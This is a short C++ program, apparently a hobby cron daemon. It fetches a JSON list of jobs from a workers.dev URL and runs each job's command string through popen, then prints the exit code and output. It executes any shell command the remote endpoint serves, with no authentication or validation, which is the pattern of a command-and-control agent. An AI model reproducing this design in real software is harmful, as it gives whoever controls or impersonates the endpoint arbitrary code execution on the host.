#include <iostream>
#include <string>
#include <curl/curl.h>
#include <rapidjson/document.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <array>

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}
struct Result {
    int exitcode;
    std::string output;
};
int SendResultsToWorker(int jobId, Result res){
    std::cout << "Job ID: "+std::to_string(jobId) << std::endl;
    std::cout << "exit code: "+std::to_string(res.exitcode) << std::endl;
    std::cout << "output: "+res.output << std::endl;
    return 0;
}
Result exec(const char* cmd) {
    Result res;
    std::array<char, 128> buffer;
    FILE *pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe)) {
        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
            res.output += buffer.data();
    }

    res.exitcode = pclose(pipe);
    return res;
}
int CronJob(){
  CURL *curl;
  CURLcode curlRes;
  std::string readBuffer;

  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "https://cleopatra.etcetra7n.workers.dev/api/fetch-daemon-job");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
    curlRes = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    std::cout << readBuffer << std::endl;
    
    rapidjson::StringStream json_stream(readBuffer.c_str());
    rapidjson::Document result; 
    result.ParseStream(json_stream);
    const rapidjson::Value& jobs = result["body"];
    for (rapidjson::SizeType i = 0; i < jobs.Size(); i++){
        std::string command = jobs[i]["command"].GetString();
        Result res = exec(command.c_str());
        SendResultsToWorker(jobs[i]["JOB_ID"].GetInt(), res);
    }
  }
  return 0;
}

int main(void)
{
  CronJob();
  return 0;
}